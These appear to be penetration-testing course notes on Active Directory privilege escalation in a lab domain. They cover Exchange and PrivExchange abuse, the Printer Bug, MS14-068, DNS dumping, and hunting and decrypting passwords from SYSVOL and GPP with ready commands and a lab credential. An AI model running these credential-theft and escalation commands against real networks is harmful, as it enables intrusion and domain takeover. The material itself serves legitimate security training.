## Exchange Related Group Membership

- Exchange Windows Permissions: can add DCSync privileges to a user
- Organization Management: domain admins of Exchange

If we compromise an Exchange server, this will lead to Domain Admin privileges. Dumping credentials will produce cleartext passwords.

## PrivExchange
Flaw in Exchange Server PushSubscription
- Relay to LDAP and dump the domain NTDS database. Will take you directly to Domain Admin with any authenticated domain user account.

## Printer Bug

**Enumerating for MS-PRN Printer Bug
```
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

## MS14-068
Need domain user credentials and can get domain admin with flaw in Kerberos. Allows a forged PAC to be accepted by the KDC as legitimate.

## Sniffing LDAP Credentials
Change the LDAP IP to that of our attack host and set up a netcat listener on port 389 to gain credentials: https://grimhacker.com/2018/03/09/just-a-printer/

## Enumerating DNS Records
https://github.com/dirkjanm/adidnsdump

**Using adidnsdump
```
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
```

**Viewing the Contents of the records.csv File
```
head records.csv 
```

**Using the -r Option to Resolve Unknown Records
```
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
head records.csv 
```


## Other Misconfigurations

**Password in Description Field
```
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

**Password not Required
```
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

**Credentials in SMB shares and SYSVOL Scripts
```
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

**Discovering an Interesting Script
```
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

**Finding a Password in the Script
```
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```
- Use crackmapexec with --local-auth flag to see if any user has this password

## Group Policy Preference (GPP) Passwords
AES private key: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN

**Decrypting the Password with gpp-decrypt
```
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```
- Manually search SYSVOL or use https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1


**Using CrackMapExec's gpp_autologin Module
```
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```


## ASREPRoasting
